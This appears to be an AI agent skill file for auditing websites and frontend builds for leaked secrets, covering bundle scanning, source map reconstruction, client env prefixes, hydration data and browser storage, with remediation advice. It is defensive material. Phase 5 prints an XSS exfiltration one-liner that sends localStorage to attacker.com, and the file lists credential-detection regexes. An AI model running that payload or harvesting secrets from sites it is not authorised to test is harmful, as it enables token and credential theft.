---
name: frontend-secret-scanner
description: >
  Frontend-specific secret and sensitive data exposure detection skill. Audits
  JavaScript bundles for hardcoded API keys and tokens, source map files leaking
  server-side code, build artifacts containing .env variable values, localStorage
  and sessionStorage storing sensitive tokens, client-side environment variable
  exposure (NEXT_PUBLIC_, REACT_APP_, VITE_), insecure postMessage data transmission,
  and secrets embedded in HTML meta tags or inline scripts. Complements secrets-scanner
  (which focuses on backend source code and configuration files) by targeting the
  browser-deliverable attack surface. Activate when the user asks to "scan frontend
  for secrets", "check JS bundle for API keys", "source map leaking code", "env
  variables in client bundle", "localStorage token storage", or "frontend secret exposure".
triggers:
  - "frontend secret"
  - "API key in bundle"
  - "source map leak"
  - "JS bundle secrets"
  - "localStorage token"
  - "REACT_APP_ exposure"
  - "NEXT_PUBLIC_ secret"
  - "VITE_ env exposure"
  - "client-side secret"
  - ".env in build"
  - "frontend credential"
  - "browser secret"
version: 1.0.0
author: bug-finder-kit
category: security
risk: safe
tags: "[frontend, secrets, api-keys, source-maps, localstorage, env-vars, bundle-analysis, javascript]"
date_added: "2026-10-22"
---

# Frontend Secret Scanner — Client-Side Secret & Sensitive Data Exposure

> Unlike backend secrets that stay on the server, frontend secrets are delivered
> directly to every user's browser — including attackers. Once an API key, token,
> or private endpoint appears in a JavaScript bundle, source map, or HTML page,
> it is effectively public regardless of how it is obfuscated.

> This skill audits the browser-deliverable attack surface: JS bundles, build
> artifacts, source maps, storage APIs, and client-side environment variable
> handling across React, Next.js, Vue, Angular, Vite, and vanilla JavaScript.

---

## Frontend Secret Exposure Attack Surface

```
Browser-Deliverable Attack Surface
  ├── JavaScript Bundles (main.js, chunk-*.js, vendor.js)
  │     ├── Hardcoded API keys, tokens, passwords in source code
  │     ├── Client-side environment variables (REACT_APP_, NEXT_PUBLIC_, VITE_)
  │     └── Internal endpoint URLs and IP addresses
  ├── Source Map Files (*.js.map)
  │     ├── Complete server-side source code reconstruction
  │     ├── Internal business logic exposed
  │     └── Additional secrets only present in original source
  ├── Build Artifacts & Static Files
  │     ├── .env files accidentally committed and deployed
  │     ├── Environment config files (config.js, settings.json)
  │     └── Compiled templates with embedded credentials
  ├── HTML Pages (index.html)
  │     ├── Secrets in <meta> tags
  │     ├── Inline <script> blocks with API keys
  │     └── window.__INITIAL_STATE__ / __NEXT_DATA__ payload objects
  └── Browser Storage
        ├── localStorage: JWTs, OAuth tokens, API keys (no HttpOnly)
        ├── sessionStorage: Same risks, shorter lifespan
        └── IndexedDB: Sensitive application state, PII
```

---

## Phase 1 — JavaScript Bundle Analysis

### 1.1 Download and Scan Production Bundles

```bash
# Download all script files linked from the main page
wget -r -np -nd -A "*.js" https://target.example.com/static/js/ -P ./bundles/

# Scan bundles for common secret patterns
grep -rE "(?i)(api[_-]?key|apikey|secret|token|password|auth|private[_-]?key)\s*[:=]\s*['\"][A-Za-z0-9_/+=-]{10,}" bundles/

# Scan for specific service key patterns
grep -rE "AIza[0-9A-Za-z_-]{35}" bundles/                        # Google API key
grep -rE "sk-[a-zA-Z0-9]{48}" bundles/                           # OpenAI secret key
grep -rE "AKIA[0-9A-Z]{16}" bundles/                              # AWS Access Key ID
grep -rE "gh[ps]_[A-Za-z0-9_]{36,251}" bundles/                  # GitHub PAT
grep -rE "xox[baprs]-[0-9a-zA-Z]{10,}" bundles/                  # Slack token
grep -rE "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}" bundles/  # JWT
grep -rE "sq0[a-z]{3}-[0-9A-Za-z\-_]{22,43}" bundles/            # Square OAuth token
grep -rE "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com" bundles/ # Google OAuth
grep -rE "-----BEGIN (RSA |EC )?PRIVATE KEY-----" bundles/        # Private key
```

### 1.2 Automated Bundle Scanning Tools

```bash
# TruffleHog (file-based scan of downloaded bundles)
trufflehog filesystem ./bundles/ --json

# Semgrep with secrets ruleset
semgrep --config "p/secrets" ./bundles/

# gitleaks on bundle directory
gitleaks detect --source ./bundles/ --no-git

# JSluice: specialized JS bundle secret extractor
jsluice secrets bundles/main.js
jsluice secrets -R bundles/   # Recursive directory scan

# retire.js: also flags outdated/vulnerable libraries in bundles
npx retire --js --path ./bundles/
```

### 1.3 Webpack/Vite Bundle Deobfuscation

Before scanning, unpack minified bundles for better pattern matching:

```bash
# Install js-beautify for readable formatting
npm install -g js-beautify

# Format a minified bundle
js-beautify bundles/main.js > bundles/main.readable.js

# Extract webpack module map
node -e "
const fs = require('fs');
const src = fs.readFileSync('bundles/main.js', 'utf8');
const modules = src.match(/\d+:\s*function\(.*?\)\s*\{/g);
console.log('Modules found:', modules ? modules.length : 0);
"
```

---

## Phase 2 — Source Map Exploitation

Source maps (`*.js.map`) are generated by build tools to aid debugging. When
deployed to production, they expose complete original source code — including
code that never executes in the browser (server components, API handlers, build scripts).

### 2.1 Detecting Exposed Source Maps

```bash
# Check if bundle files link to source maps
curl -s https://target.example.com/static/js/main.abc123.js | tail -1
# Look for: //# sourceMappingURL=main.abc123.js.map

# Attempt to fetch the source map directly
curl -s https://target.example.com/static/js/main.abc123.js.map | head -5
# {"version":3,"sources":["webpack://src/api/client.ts","webpack://src/config/keys.ts",...]}

# Check for X-SourceMap header (alternative delivery)
curl -s -I https://target.example.com/static/js/main.abc123.js | grep -i "x-sourcemap"
```

### 2.2 Source Map Reconstruction Tools

```bash
# source-map-explorer: visualize and extract source from maps
npm install -g source-map-explorer
source-map-explorer bundles/main.abc123.js

# sourcemapper: reconstruct original file tree from .js.map
pip install sourcemapper
sourcemapper -url https://target.example.com/static/js/main.abc123.js.map -output ./reconstructed/

# Manual extraction with Node.js
node -e "
const { SourceMapConsumer } = require('source-map');
const fs = require('fs');
const rawMap = JSON.parse(fs.readFileSync('main.js.map', 'utf8'));
SourceMapConsumer.with(rawMap, null, consumer => {
    consumer.sources.forEach(src => {
        const content = consumer.sourceContentFor(src, true);
        if (content) {
            console.log('=== FILE:', src, '===');
            console.log(content.substring(0, 500));
        }
    });
});
"
```

### 2.3 Source Map Remediation

```javascript
// webpack.config.js
module.exports = {
    devtool: process.env.NODE_ENV === 'production'
        ? false        // No source maps in production
        : 'eval-source-map',  // In-memory source maps for dev only

    // Alternative: generate source maps but serve only via authenticated internal tool
    // devtool: 'hidden-source-map'  // Generates .map file but removes //# sourceMappingURL link
};
```

```javascript
// vite.config.js
export default defineConfig({
    build: {
        sourcemap: false,  // Disable in production
        // Or: sourcemap: 'hidden'  // Generate but don't link from bundle
    }
});
```

---

## Phase 3 — Environment Variables in Client Bundles

Modern frameworks have conventions for exposing environment variables to the
browser. Variables with specific prefixes are **intentionally baked into the bundle**.
Any secret assigned to these prefixes becomes public.

### 3.1 Framework-Specific Prefix Danger Zones

| Framework | Public Prefix (BAKED INTO BUNDLE) | Private (Server-Only) |
|---|---|---|
| **Create React App** | `REACT_APP_` | All others (e.g., `DATABASE_URL`) |
| **Next.js** | `NEXT_PUBLIC_` | All others |
| **Vite** | `VITE_` | All others |
| **Vue CLI** | `VUE_APP_` | All others |
| **Nuxt** | `NUXT_PUBLIC_` | `NUXT_` (server-only) |
| **Gatsby** | `GATSBY_` | All others |
| **Angular** | `environment.ts` values | Backend env vars |

### 3.2 Scanning Source Code for Unsafe Variable Exposure

```bash
# Find secrets assigned to public prefixes in source code
grep -rn "REACT_APP_SECRET\|REACT_APP_KEY\|REACT_APP_TOKEN\|REACT_APP_PASS" src/
grep -rn "NEXT_PUBLIC_SECRET\|NEXT_PUBLIC_API_KEY\|NEXT_PUBLIC_TOKEN" .
grep -rn "VITE_SECRET\|VITE_PRIVATE\|VITE_API_KEY\|VITE_TOKEN" .

# Audit .env files for sensitive vars with public prefixes
grep -E "^(REACT_APP_|NEXT_PUBLIC_|VITE_|VUE_APP_)" .env* | grep -iE "secret|key|password|token|private"

# Scan built bundle for env placeholder values
grep -rE "process\.env\.(REACT_APP_|NEXT_PUBLIC_|VITE_)" dist/ build/
```

### 3.3 What Belongs on Client vs. Server

```
SAFE for NEXT_PUBLIC_ / REACT_APP_ / VITE_:
  ✅ Public analytics tracking IDs (Google Analytics GA4 ID)
  ✅ Public CDN base URLs
  ✅ Public feature flags (non-sensitive toggles)
  ✅ Application version strings
  ✅ Public Stripe publishable key (pk_live_... — not secret key!)

NEVER use public prefixes for:
  ❌ Stripe secret key (sk_live_...)
  ❌ Database connection strings
  ❌ API keys for server-to-server calls (OpenAI, Twilio, SendGrid)
  ❌ JWT signing secrets
  ❌ OAuth client secrets
  ❌ AWS secret access keys
  ❌ Internal microservice URLs and credentials
```

---

## Phase 4 — `window.__NEXT_DATA__` and Server-State Hydration

Next.js and similar SSR frameworks serialize server-fetched data into the HTML
page as a JSON payload for client hydration. Sensitive server-side data inadvertently
included in this payload is instantly visible in the page source.

### 4.1 Detecting Over-Shared Hydration Data

```bash
# Extract __NEXT_DATA__ payload from a live page
curl -s https://target.example.com/ | grep -o '<script id="__NEXT_DATA__"[^>]*>.*</script>' | \
  sed 's/.*<script[^>]*>//;s/<\/script>.*//' | python3 -m json.tool | \
  grep -iE "key|token|secret|password|auth|private"

# Check for other common hydration patterns
grep -i "window\.__INITIAL_STATE__\|window\.__APP_STATE__\|window\.__STATE__" index.html
```

### 4.2 Next.js Secure Data Fetching Pattern

```javascript
// VULNERABLE: Passing server secrets to client via getServerSideProps
export async function getServerSideProps(context) {
    const data = await fetchInternalAPI(process.env.INTERNAL_API_KEY); // Private key!
    return {
        props: {
            data,
            apiKey: process.env.INTERNAL_API_KEY  // NEVER do this! Baked into __NEXT_DATA__
        }
    };
}

// SAFE: Return only the data the client needs; keep keys server-side
export async function getServerSideProps(context) {
    const data = await fetchInternalAPI(process.env.INTERNAL_API_KEY); // Used server-side only
    return {
        props: {
            publicData: data.publicFields  // Only serialize what the client renders
        }
    };
}
```

---

## Phase 5 — localStorage & sessionStorage Token Storage

### 5.1 Why localStorage Is Dangerous for Authentication Tokens

`localStorage` and `sessionStorage` are accessible to **all JavaScript on the page** — including
third-party scripts, browser extensions, and any XSS payload. They provide no CSRF protection
and no browser-enforced expiry tied to session termination.

```javascript
// VULNERABLE: Storing authentication tokens in localStorage
localStorage.setItem('authToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');
localStorage.setItem('apiKey', 'sk-live-abc123');  // Readable by any XSS payload!

// XSS attacker's extraction payload (one-liner):
fetch('https://attacker.com/exfil?data=' + encodeURIComponent(JSON.stringify(localStorage)));
```

### 5.2 Scanning for Storage of Sensitive Keys

```bash
# Find localStorage.setItem calls with sensitive key names
grep -rn "localStorage\.setItem(" src/ | grep -iE "token|key|secret|auth|password|jwt"
grep -rn "sessionStorage\.setItem(" src/ | grep -iE "token|key|secret|auth|password"

# Find direct property assignments
grep -rn "localStorage\[" src/ | grep -iE "token|auth|secret"
```

### 5.3 Secure Token Storage Alternatives

| Mechanism | XSS Accessible? | CSRF Accessible? | Recommended Use |
|---|---|---|---|
| `localStorage` | ✅ Yes | No | Non-sensitive preferences only |
| `sessionStorage` | ✅ Yes | No | Short-lived, non-sensitive data |
| `HttpOnly` Cookie | ❌ No | ✅ Yes (needs CSRF token) | Authentication sessions |
| `SameSite=Strict` + `HttpOnly` Cookie | ❌ No | ❌ No | Best for auth tokens |
| In-memory (JS variable) | ✅ Yes (this tab only) | No | Short-lived SPAs (lost on refresh) |

---

## Phase 6 — HTML, Meta Tags & Inline Script Leaks

### 6.1 Scan HTML for Embedded Secrets

```bash
# Download rendered HTML and scan for credential patterns
curl -s https://target.example.com/ | grep -iE "(api[_-]?key|token|secret|password)\s*[:=]\s*['\"][A-Za-z0-9_-]{10,}"

# Check meta tags for credential-like content
curl -s https://target.example.com/ | grep -i "<meta" | grep -iE "key|token|secret"

# Scan for analytics / tracking scripts embedding sensitive data
curl -s https://target.example.com/ | grep -iE "gtag|fbq|intercom|heap|fullstory" | \
  grep -iE "secret|key|token|password"
```

---

## Phase 7 — Audit Checklist & Finding Format

### Frontend Secret Exposure Checklist

```
[ ] JavaScript Bundles:
    - Scanned production bundles for secret patterns (TruffleHog, jsluice, semgrep)
    - No API keys or tokens for server-side services embedded in client code
    - No private keys or certificates in bundle files

[ ] Source Maps:
    - Source maps not deployed to production web root
    - webpack devtool: false (production) or 'hidden-source-map'
    - No //# sourceMappingURL link in production bundle files

[ ] Environment Variables:
    - No sensitive values assigned to REACT_APP_, NEXT_PUBLIC_, VITE_ prefixes
    - .env files not committed to source control or deployed as static assets
    - Only non-secret public values use browser-exposed env prefixes

[ ] Server-State Hydration:
    - __NEXT_DATA__ / window.__INITIAL_STATE__ reviewed for sensitive fields
    - Server-side API keys never passed to getServerSideProps props return

[ ] Browser Storage:
    - Auth tokens stored in HttpOnly + SameSite cookies, not localStorage
    - No API keys or secrets stored in localStorage or sessionStorage
    - IndexedDB content reviewed for sensitive application state

[ ] HTML Pages:
    - No secrets in <meta> tags, inline <script> data, or HTML comments
    - Third-party analytics integrations do not receive PII or internal IDs
```

### Finding Template

```
### [Severity] Frontend Secret Exposure: <Title>
- Location: <bundle filename, URL, HTML page, localStorage key>
- Secret Type: API Key | Token | Private Key | Internal URL | Credentials
- Exposure Vector: JS Bundle | Source Map | HTML Page | localStorage | Env Variable
- Impact: <What an attacker can do with this credential>
- Evidence:
    File: main.abc123.js, Line ~4820
    Value: REACT_APP_STRIPE_SECRET=sk-live-[REDACTED]
- Remediation:
    - Move to server-side only, remove from public prefix
    - Rotate/revoke the exposed credential immediately
    - Disable source maps in production build config
- Confidence: Confirmed | Likely | Requires Bundle Download
```

### Severity Guide

| Severity | Condition |
|---|---|
| **Critical** | Private key, OAuth secret, or high-privilege API key (Stripe secret, AWS secret) exposed in bundle |
| **Critical** | Source map deployed enabling complete server code reconstruction |
| **High** | Low-privilege API key with data access exposed in bundle |
| **High** | JWT auth token readable from localStorage (XSS-amplifiable) |
| **Medium** | Internal service URLs or IP addresses in bundle |
| **Medium** | `.env` file deployed as accessible static asset |
| **Low** | Non-sensitive analytics IDs exposed (acceptable by convention) |
